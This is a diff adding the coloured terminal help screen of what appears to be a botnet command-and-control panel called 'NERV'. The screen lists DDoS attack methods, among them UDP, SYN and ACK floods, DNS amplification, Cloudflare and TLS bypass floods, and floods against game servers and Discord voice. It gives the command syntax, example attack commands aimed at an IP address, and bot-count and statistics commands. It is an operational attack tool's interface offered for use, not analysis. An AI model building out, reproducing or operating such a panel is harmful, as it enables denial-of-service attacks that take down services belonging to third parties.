@@ -1,0 +1,48 @@
+\x1b[38;2;0;230;118m═══════════════════════════════════════════════════════════\x1b[0m
+\x1b[38;2;155;38;182m  NERV COMMAND INTERFACE - ATTACK VECTORS\x1b[0m
+\x1b[38;2;0;230;118m═══════════════════════════════════════════════════════════\x1b[0m
+\x1b[0m
+\x1b[38;2;155;38;182mLayer 4:\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mudp\x1b[0m        \x1b[38;2;128;128;128mUDP flood - high bandwidth\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mudpplain\x1b[0m   \x1b[38;2;128;128;128mUDP socket flood (no raw socket)\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mudphex\x1b[0m     \x1b[38;2;128;128;128mUDP flood with hex payload\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182msyn\x1b[0m        \x1b[38;2;128;128;128mTCP SYN flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mack\x1b[0m        \x1b[38;2;128;128;128mTCP ACK flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mstomp\x1b[0m      \x1b[38;2;128;128;128mTCP handshake + ACK/PSH flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mtcpbypass\x1b[0m  \x1b[38;2;128;128;128mTCP flood to bypass mitigation\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182msocket\x1b[0m     \x1b[38;2;128;128;128mStandard TCP socket flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mgreip\x1b[0m      \x1b[38;2;128;128;128mGRE IP encapsulation flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mgreeth\x1b[0m     \x1b[38;2;128;128;128mGRE Ethernet encapsulation flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mpps\x1b[0m        \x1b[38;2;128;128;128mPPS (packets per second) raw flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mdns\x1b[0m        \x1b[38;2;128;128;128mDNS amplification attack\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mesp\x1b[0m        \x1b[38;2;128;128;128mESP/IPSec flood\x1b[0m
+\x1b[0m
+\x1b[38;2;155;38;182mLayer 7:\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mhttp\x1b[0m       \x1b[38;2;128;128;128mHTTP/1.1 GET flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mtls\x1b[0m        \x1b[38;2;128;128;128mTLS/SSL handshake flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mtlsplus\x1b[0m    \x1b[38;2;128;128;128mTLS+ bypass flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mcloudflare\x1b[0m \x1b[38;2;128;128;128mCloudflare bypass flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mnerv_l7\x1b[0m    \x1b[38;2;128;128;128mNERV L7 special bypass flood\x1b[0m
+\x1b[0m
+\x1b[38;2;155;38;182mGames:\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mvse\x1b[0m        \x1b[38;2;128;128;128mValve Source Engine query flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mraknet\x1b[0m     \x1b[38;2;128;128;128mRakNet game server flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mfivem\x1b[0m      \x1b[38;2;128;128;128mFiveM game server connect flood\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mdiscord\x1b[0m    \x1b[38;2;128;128;128mDiscord voice gateway flood\x1b[0m
+\x1b[0m
+\x1b[38;2;155;38;182mUsage:\x1b[0m \x1b[38;2;128;128;128m<method> <target> <port> <duration> [options]\x1b[0m
+\x1b[0m
+\x1b[38;2;0;230;118m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m
+\x1b[0m
+\x1b[38;2;155;38;182mCommands:\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182maccount\x1b[0m   \x1b[38;2;128;128;128mView account information\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mpasswd\x1b[0m    \x1b[38;2;128;128;128mChange password\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mcount\x1b[0m     \x1b[38;2;128;128;128mShow total bot count\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mstats\x1b[0m     \x1b[38;2;128;128;128mShow bot statistics\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mclear\x1b[0m     \x1b[38;2;128;128;128mClear screen\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mthemes\x1b[0m    \x1b[38;2;128;128;128mList or change theme\x1b[0m
+\x1b[0m
+\x1b[38;2;155;38;182mExamples:\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mudp 1.1.1.1 80 60 len=1400\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182mraknet 1.1.1.1 19132 60 len=24\x1b[0m
+  \x1b[38;2;0;230;118m-\x1b[0m \x1b[38;2;155;38;182msyn 1.1.1.1 443 60 dport=443 ttl=64\x1b[0m
